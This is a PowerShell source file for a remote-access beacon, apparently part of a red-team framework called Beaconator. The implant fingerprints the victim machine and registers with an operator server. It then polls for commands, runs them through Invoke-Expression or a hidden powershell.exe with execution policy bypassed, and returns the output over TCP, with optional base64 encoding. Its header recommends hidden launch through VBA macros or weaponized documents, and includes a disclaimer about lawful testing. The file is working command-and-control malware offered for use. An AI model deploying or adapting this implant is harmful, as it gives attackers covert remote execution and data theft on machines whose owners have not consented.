# SimpleBeacon.ps1
# Simplified PowerShell Beacon for Beaconator.
# Paste in the proper server IP where it says (insert your server IP here)
# For best results for red teams, launch via a VBA script, .bat or command string to make it hidden (see weaponized document section).
# Only use Beaconator for legal and ethical testing purposes, as part of red or purple team testing.

param(
    [string]$Server = "(insert your server IP here)",
    [int]$Port = 5074,
    [ValidateSet("plaintext", "base64")]
    [string]$Encoding = "plaintext",
    [int]$Interval = 15
)

# Generate unique beacon ID
function Get-BeaconID {
    $systemInfo = "$env:COMPUTERNAME$env:OS$env:USERNAME"
    try {
        $mac = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress }).MACAddress | Select-Object -First 1
        if ($mac) { $systemInfo += $mac }
    } catch { }
    $systemInfo += $PSCommandPath
    
    $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
    $hash = $md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($systemInfo))
    $hashString = [System.BitConverter]::ToString($hash).Replace("-", "").ToLower()
    return $hashString.Substring(0, 8)
}

# Logging function
function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host "[$timestamp] $Message"
}

# Encode message based on strategy
function Encode-Message {
    param([string]$Message)
    if ($Encoding -eq "base64") {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Message)
        return [System.Convert]::ToBase64String($bytes)
    }
    return $Message
}

# Decode message based on strategy
function Decode-Message {
    param([string]$Message)
    if ($Encoding -eq "base64") {
        try {
            $bytes = [System.Convert]::FromBase64String($Message)
            return [System.Text.Encoding]::UTF8.GetString($bytes)
        }
        catch {
            Write-Log "Base64 decode error: $($_.Exception.Message), treating as plaintext"
            return $Message
        }
    }
    return $Message
}

# Send TCP message
function Send-TCPMessage {
    param(
        [string]$Message,
        [bool]$ExpectResponse = $true
    )
    
    try {
        $encodedMessage = Encode-Message $Message
        
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.ReceiveTimeout = 30000
        $tcpClient.SendTimeout = 30000
        
        $tcpClient.Connect($Server, $Port)
        $stream = $tcpClient.GetStream()
        
        $messageBytes = [System.Text.Encoding]::UTF8.GetBytes($encodedMessage)
        $stream.Write($messageBytes, 0, $messageBytes.Length)
        
        if ($ExpectResponse) {
            $buffer = New-Object byte[] 4096
            $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
            $response = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead).Trim()
            
            if ($Encoding -eq "base64") {
                Write-Log "Received encoded response: $response"
            }
            
            $decodedResponse = Decode-Message $response
            
            if ($Encoding -eq "base64") {
                Write-Log "Decoded response: $decodedResponse"
            }
            
            $tcpClient.Close()
            return $decodedResponse
        }
        else {
            $tcpClient.Close()
            return "OK"
        }
    }
    catch {
        Write-Log "TCP Error: $($_.Exception.Message)"
        return "ERROR: $($_.Exception.Message)"
    }
}

# Execute command with multiple fallback methods
function Invoke-SafeCommand {
    param([string]$Command)
    
    try {
        Write-Log "Executing: $Command"
        
        # Method 1: Direct execution in current session
        try {
            $result = Invoke-Expression $Command 2>&1
            if ($result) {
                $output = $result | Out-String
                return $output.Trim()
            } else {
                return "Command executed successfully (no output)"
            }
        }
        catch {
            Write-Log "Direct execution failed: $($_.Exception.Message)"
        }
        
        # Method 2: PowerShell job (runs in background)
        try {
            $job = Start-Job -ScriptBlock { 
                param($cmd) 
                try {
                    Invoke-Expression $cmd 2>&1 | Out-String
                } catch {
                    "ERROR: $($_.Exception.Message)"
                }
            } -ArgumentList $Command
            
            if (Wait-Job $job -Timeout 300) {
                $output = Receive-Job $job
                Remove-Job $job
                if ($output) {
                    return $output.Trim()
                } else {
                    return "Command executed successfully (no output)"
                }
            } else {
                Remove-Job $job -Force
                return "ERROR: Command timeout (300s)"
            }
        }
        catch {
            Write-Log "Job execution failed: $($_.Exception.Message)"
        }
        
        # Method 3: Separate PowerShell process (last resort)
        try {
            $pinfo = New-Object System.Diagnostics.ProcessStartInfo
            $pinfo.FileName = "powershell.exe"
            $pinfo.RedirectStandardError = $true
            $pinfo.RedirectStandardOutput = $true
            $pinfo.UseShellExecute = $false
            $pinfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"& {$Command}`""
            $pinfo.CreateNoWindow = $true
            $pinfo.WorkingDirectory = $env:USERPROFILE
            
            $process = New-Object System.Diagnostics.Process
            $process.StartInfo = $pinfo
            $process.Start() | Out-Null
            
            if ($process.WaitForExit(300000)) {
                $stdout = $process.StandardOutput.ReadToEnd()
                $stderr = $process.StandardError.ReadToEnd()
                
                $output = ""
                if ($stdout) { $output += "STDOUT:`n$stdout`n" }
                if ($stderr) { $output += "STDERR:`n$stderr`n" }
                if (-not $output) { $output = "Command executed (exit code: $($process.ExitCode))" }
                
                return $output.Trim()
            } else {
                try { $process.Kill() } catch { }
                return "ERROR: Command timeout (300s)"
            }
        }
        catch {
            return "ERROR: All execution methods failed - $($_.Exception.Message)"
        }
    }
    catch {
        return "ERROR: $($_.Exception.Message)"
    }
}

# Main execution
$beaconId = Get-BeaconID
$computerName = $env:COMPUTERNAME

Write-Log "[+] Simple PowerShell Beacon initialized"
Write-Log "    Beacon ID: $beaconId"
Write-Log "    Computer: $computerName"
Write-Log "    Server: ${Server}:${Port}"
Write-Log "    Encoding: $($Encoding.ToUpper())"

# Register with server
$registerMessage = "register|$beaconId|$computerName"
Write-Log "Registering with message: $registerMessage"

if ($Encoding -eq "base64") {
    Write-Log "Encoded message: $(Encode-Message $registerMessage)"
}

$registerResponse = Send-TCPMessage $registerMessage
Write-Log "Registration response: $registerResponse"

# Main beacon loop
Write-Log "Starting beacon loop..."
$isRunning = $true

try {
    while ($isRunning) {
        try {
            Write-Log "Starting beacon cycle..."
            
            # Request action from server
            $actionMessage = "request_action|$beaconId"
            Write-Log "Requesting action: $actionMessage"
            
            if ($Encoding -eq "base64") {
                Write-Log "Encoded message: $(Encode-Message $actionMessage)"
            }
            
            $action = Send-TCPMessage $actionMessage
            Write-Log "Action response: $action"
            
            # Process command if received
            if ($action -and $action -ne "" -and $action -ne "no_pending_commands" -and -not $action.StartsWith("ERROR")) {
                Write-Log "Processing: $action"
                
                # Handle different command formats
                $commandToExecute = ""
                if ($action.StartsWith("execute_command|")) {
                    $commandToExecute = $action.Substring("execute_command|".Length)
                } elseif (-not $action.Contains("|")) {
                    $commandToExecute = $action
                } else {
                    Write-Log "Unknown command format: $action"
                    continue
                }
                
                if ($commandToExecute) {
                    # Execute command
                    $output = Invoke-SafeCommand $commandToExecute
                    
                    # Send output back to server
                    $outputMessage = "command_output|$beaconId|$output"
                    Write-Log "Sending command output: $($output.Length) characters"
                    
                    if ($Encoding -eq "base64") {
                        $encodedLength = (Encode-Message $outputMessage).Length
                        Write-Log "Encoded message length: $encodedLength characters"
                    }
                    
                    $outputResponse = Send-TCPMessage $outputMessage $false
                    Write-Log "Output send response: $outputResponse"
                }
            }
            elseif ($action -and $action.StartsWith("ERROR")) {
                Write-Log "Communication error: $action"
                Write-Log "Will retry in next cycle..."
            }
            
            # Wait before next cycle
            Write-Log "Waiting $Interval seconds before next cycle..."
            Start-Sleep -Seconds $Interval
        }
        catch {
            if ($_.Exception.Message -match "KeyboardInterrupt|BreakException") {
                Write-Log "Beacon interrupted by user"
                break
            } else {
                Write-Log "Beacon error: $($_.Exception.Message)"
                Start-Sleep -Seconds 5
            }
        }
    }
}
catch {
    Write-Log "Fatal beacon error: $($_.Exception.Message)"
}
finally {
    $isRunning = $false
    Write-Log "Simple beacon stopped"
}
